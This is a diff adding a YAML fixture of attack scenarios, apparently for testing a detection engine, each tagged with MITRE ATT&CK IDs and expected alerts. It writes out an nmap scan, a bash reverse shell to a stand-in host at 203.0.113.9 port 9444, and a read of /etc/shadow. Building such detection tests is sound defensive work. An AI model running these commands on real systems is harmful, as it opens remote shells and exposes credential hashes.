@@ -1,0 +1,41 @@
+false_positives:
+attacks:
+  - id: P1
+    tactic: TA0007
+    technique: T1046
+    name: scan single process tree
+    platforms: [linux]
+    cmd: 'nmap -sS 203.0.113.9'
+    bin: nmap
+    creates_process: true
+    mode: real
+    expected_signals: [net_scan_external]
+    related_signals: []
+    expect: detectable
+    impact: none
+  - id: P2
+    tactic: TA0002
+    technique: T1059.004
+    name: reverse shell two unrelated roots
+    platforms: [linux]
+    cmd: 'bash -i >& /dev/tcp/203.0.113.9/9444 0>&1'
+    bin: bash
+    creates_process: true
+    mode: real
+    expected_signals: [reverse_shell]
+    related_signals: []
+    expect: detectable
+    impact: destructive
+  - id: P3
+    tactic: TA0006
+    technique: T1552.001
+    name: credential read alert without process
+    platforms: [linux]
+    cmd: 'cat /etc/shadow'
+    bin: cat
+    creates_process: true
+    mode: real
+    expected_signals: [credential_file_read]
+    related_signals: []
+    expect: detectable
+    impact: none
